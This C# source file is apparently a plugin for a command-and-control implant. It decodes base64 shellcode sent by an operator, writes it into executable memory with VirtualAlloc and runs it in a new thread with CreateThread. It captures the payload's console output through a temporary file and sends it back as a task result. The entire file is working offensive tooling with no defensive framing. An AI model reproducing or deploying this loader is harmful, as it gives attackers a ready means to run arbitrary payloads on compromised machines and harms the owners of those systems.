using PluginBase;
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;
using System.Text;

namespace Plugin
{
    public class injectshellcode
    {
        public static void Execute(Dictionary<string, object> args)
        {
            string res = "";

            if (args.ContainsKey("File") && (string)args["File"] != "")
            {
                //injection in current process
                if (args.ContainsKey("procID") && args["procID"].ToString() == "0")
                {
                    var x64shellcode = Convert.FromBase64String((string)args["shellcode"]);

                    FileStream filestream = new FileStream("out.txt", FileMode.Create);
                    var streamwriter = new StreamWriter(filestream);
                    streamwriter.AutoFlush = true;


                    //P/Invoke must be used to redirect stdout from the shellcode thread.
                    //see https://stackoverflow.com/questions/54094127/redirecting-stdout-in-win32-does-not-redirect-stdout
                    // http://jdebp.info/FGA/redirecting-standard-io.html

                    IntPtr handle = filestream.SafeFileHandle.DangerousGetHandle();
                    int stdout = _dup(1);
                    int fd = _open_osfhandle(handle, 0x00040000);
                    _dup2(fd, 1);
                    _close(fd);

                    //may be necessary for some programs... but not until now. 
                    /*
                    StringBuilder builder = new StringBuilder();
                    TextWriter writer = new StringWriter(builder);
                    Console.SetOut(writer);
                    Console.SetError(writer);

                    // IntPtr stdout = GetStdHandle(-11);
                    // IntPtr sterr = GetStdHandle(-12);
                    // int status = SetStdHandle(-11, handle); // set stdout
                    // Check status as needed
                    // status = SetStdHandle(-12, handle); // set stderr
                    // Check status as needed
                    */


                    IntPtr funcAddr = VirtualAlloc(
                                          IntPtr.Zero,
                                          (ulong)x64shellcode.Length,
                                          (uint)StateEnum.MEM_COMMIT,
                                          (uint)Protection.PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(x64shellcode, 0, (IntPtr)(funcAddr), x64shellcode.Length);

                    IntPtr hThread = IntPtr.Zero;
                    uint threadId = 0;
                    IntPtr pinfo = IntPtr.Zero;

                    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);

                    int millisec = (int)(long)args["timer"]*1000;
                    Thread.Sleep(millisec);

                    //WaitForSingleObject(hThread, 0xFFFFFFFF);
                    WaitForSingleObject(hThread, 0);



                    filestream.Flush();
                    //Thread.Sleep(1000);
                    filestream.Close();
                    _dup2(stdout, 1);

                    using (StreamReader sr = new StreamReader("out.txt"))
                    {
                        res = sr.ReadToEnd();
                    }
                    File.Delete("out.txt");
                    PluginHandler.AddResponse(new ResponseResult
                    {
                        completed = "true",
                        user_output = res,
                        task_id = (string)args["task-id"],
                        // status = "error"
                    });
                }
            }
        }
        #region pinvokes
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            ulong size,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(
            uint lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        [DllImport("Kernel32.dll", SetLastError = true)]
        private static extern int SetStdHandle(int device, IntPtr handle);

        [DllImport("Kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetStdHandle(int device);

        [DllImport("msvcrt.dll")]
        private static extern int _dup2(int fd1, int fd2);

        [DllImport("msvcrt.dll")]
        private static extern int _dup(int fd1);

        [DllImport("msvcrt.dll")]
        private static extern int _open_osfhandle(IntPtr fd1, int fd2);

        [DllImport("msvcrt.dll")]
        private static extern int _close(int fd2);

        [DllImport("msvcrt.dll")]
        private static extern IntPtr _get_osfhandle(int fd2);


        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }
        #endregion
    }
}